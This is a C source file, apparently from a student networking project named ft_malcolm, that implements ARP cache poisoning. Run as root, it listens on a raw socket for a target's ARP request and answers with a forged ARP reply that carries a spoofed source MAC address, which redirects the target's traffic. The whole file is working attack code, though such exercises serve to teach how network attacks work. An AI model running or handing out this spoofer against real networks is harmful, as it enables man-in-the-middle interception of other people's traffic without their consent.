#include "ft_malcolm.h"

volatile sig_atomic_t running;

void send_spoofed_packet(const char *source_spoofed_mac_address, const char *target_ip, const char *target_mac_address,
    const int s, char interface_name[16], union etherframe *frame) {

    print_arp_request(target_ip, target_mac_address);

    // ARP Packet preparation
    frame->field.arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
    ft_memcpy(frame->field.arp.arp_tha, frame->field.arp.arp_sha,  ETH_ALEN);
    spoof_arp_mac_addr(frame->field.arp.arp_sha, source_spoofed_mac_address); // Spoof source Mac Address
    // Switch IP Addresses in ARP packet
    uint8_t buf_1[sizeof(frame->field.arp.arp_spa)];
    ft_memcpy(buf_1, frame->field.arp.arp_spa, sizeof(buf_1));
    ft_memcpy(frame->field.arp.arp_spa, frame->field.arp.arp_tpa, sizeof(frame->field.arp.arp_spa));
    ft_memcpy(frame->field.arp.arp_tpa, buf_1, sizeof(frame->field.arp.arp_tpa));

    // Switch destination and source values in the ethernet header
    ft_memcpy(frame->field.header.ether_dhost, frame->field.header.ether_shost, ETH_ALEN);
    ft_memcpy(frame->field.header.ether_shost, frame->field.arp.arp_sha, ETH_ALEN);

    // Setup sockaddr structure for the network device
    struct sockaddr_ll device = {0};
    device.sll_ifindex = if_nametoindex(interface_name);
    device.sll_family = AF_PACKET;
    ft_memcpy(device.sll_addr, frame->field.arp.arp_sha, ETH_ALEN);
    device.sll_halen = htons(ETH_ALEN);

    // Send ARP Packet
    printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
    if (sendto(s, frame->full_frame, FRAME_LEN, 0, (struct sockaddr *) &device, sizeof(device)) > 0) {
        fprintf(stderr, "Sent an ARP reply packet, you may now check the arp table on the target.\n");
    } else {
        fprintf(stderr, "Error, ARP reply packet could not be sent : %s\n", strerror(errno));
    }

    running = 0;
}

int main (const int argc, char **argv) {
    const char *source_ip = argv[1];
    const char *source_spoofed_mac_address = argv[2];
    const char *target_ip = argv[3];
    const char *target_mac_address = argv[4];
    int s;
    char interface_name[IFNAMSIZ] = {0};

    running = 1;
    struct sigaction sa = {0};
    sa.sa_handler = signal_handler;
    sigaction(SIGINT, &sa, NULL);

    if (getuid() != 0) {
        fprintf(stderr, "This program must be run as root\n");
        return 1;
    }

    if (!valid_arguments(argc, argv)) {
        return 1;
    }

    find_suitable_interface(interface_name, target_ip);
    if (interface_name[0] == '\0') {
        fprintf(stderr, "Error: Could not find suitable network interface\n");
        return 1;
    }

    if ((s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        fprintf(stderr, "Error: could not open socket\n");
        return 1;
    }

    // Wait for incoming packet...
    while (running) {
        union etherframe frame;
        const ssize_t rec = recvfrom(s, frame.full_frame, FRAME_LEN, 0, NULL, NULL);
        if (rec == -1) {
            if (errno == EINTR) {
                fprintf(stderr, "recvfrom system call has been interrupted by a signal\n");
            } else {
                fprintf(stderr, "Error while receiving packets: %s\n", strerror(errno));
            }
            continue;
        }
        if (is_target_arp_packet(source_ip, target_ip, target_mac_address, frame)) {
            send_spoofed_packet(source_spoofed_mac_address, target_ip, target_mac_address, s, interface_name, &frame);
        }
    }

    close(s);
    printf("Exiting program...\n");
    return 0;
}
